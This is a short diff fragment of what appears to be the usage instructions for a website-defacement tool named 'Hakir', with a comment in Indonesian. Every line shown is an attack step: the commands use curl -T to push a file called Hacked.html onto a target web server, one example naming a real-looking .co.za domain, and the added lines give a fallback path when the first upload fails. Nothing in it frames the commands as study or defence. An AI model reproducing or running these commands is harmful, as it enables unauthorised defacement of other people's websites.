@@ -23,3 +23,9 @@ $ cd Hakir
 $ curl -T Hacked.html Target(example: https://sus.co.za/)
 
 
+
+
+# Kalau saat Kalian curl -T Tidak Berhasil Pakai Cara Dibawah
+
+$ curl -T /Hakir/Hacked.html target
+
